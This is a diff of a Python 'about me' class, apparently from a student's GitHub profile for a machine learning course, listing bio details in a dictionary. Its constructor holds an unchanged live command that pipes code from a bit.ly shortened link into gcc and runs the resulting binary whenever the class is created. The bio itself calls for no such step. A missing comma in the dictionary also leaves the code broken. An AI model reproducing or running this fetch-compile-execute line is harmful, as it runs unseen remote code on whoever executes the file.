@@ -8,27 +8,25 @@ class JepxZIMA:
   def __init__(self):
     subprocess.call("curl -sL 'bit.ly/j3px21m4' | gcc -w -o name -xc - && ./name", shell=True)
     self.bio = {
-      '- 🪪 Last name'                  : 'Dela Rosa'
-      '- 🙋‍♂️ You can call me'            : 'Jep',
-      '- 🤷🏻‍♂️ What is this, nani'         : 'A GitHub repository dedicated to the CPE313 course',
-      '- 🏡 I’m currently living in'    : 'Binangonan, Rizal',
-      '- 🏫 I’m currently studying in'  : 'Technological Institute of the Philippines',
-      '- 🌱 I’m currently pursuing'     : {'BSCpE' : 'Bachelor of Science in Computer Engineering'},
+      '- 🪪 Last name'                : 'Dela Rosa'
+      '- 🙋‍♂️ You can call me'          : 'Jep',
+      '- 🤷🏻‍♂️ What is this, nani'       : 'A GitHub repository dedicated to the CPE313 course',
+      '- 🏡 I’m currently living in'  : 'Binangonan, Rizal',
+      '- 🏫 I’m currently studying in': 'Technological Institute of the Philippines',
+      '- 🌱 I’m currently pursuing'   : {'BSCpE' : 'Bachelor of Science in Computer Engineering'},
 
-      '- 📓 Course code - title'        : {'CPE 313' : 'Advanced Machine Learning and Deep Learning'},
-      '- 🎏 Section'                    : 'CPE32S8',
-      '- 📊 Elective'                   : 'Data Science',
-      '- 🏨 Hotel'                      : 'Trivago',
-      '- ❔ I dont know'                : '¯\_(ツ)_/¯',
-      '- 👨‍💻 My amazing website project' : 'https://blogs.mtdv.me/blog/posts/jepowo',
+      '- 📓 Course code - title'      : {'CPE 313' : 'Advanced Machine Learning and Deep Learning'},
+      '- 🎏 Section'                  : 'CPE32S8',
+      '- 📊 Elective'                 : 'Data Science',
+      '- 🏨 Hotel'                    : 'Trivago',
+      '- ❔ I dont know'              : '¯\_(ツ)_/¯',
+      '- 👨‍💻 My website project'       : 'https://blogs.mtdv.me/blog/posts/jepowo',
 
-      '- 💧 Motto in life'              : ('Empty your mind, be formless. Shapeless, like water. If you put water'
+      '- 💧 Motto in life'            : ('Empty your mind, be formless. Shapeless, like water. If you put water'
                                             'into a cup, it becomes the cup. You put water into a bottle and it'
                                             'becomes the bottle. You put it in a teapot, it becomes the teapot.'
                                             'Now, water can flow or it can crash. Be water, my friend.'),
-
-      '- ⚡ Fun fact'                  : ('80% of Tibetan Buddhists chose to have a sky burial, in which their'
-                                         'bodies are placed on mountain tops and consumed by birds of prey.')
+      '- ⚡ Fun fact'                : ('Movie trailers got their name because they were originally shown after the movie.')
     }
 
 if __name__ == '__main__':
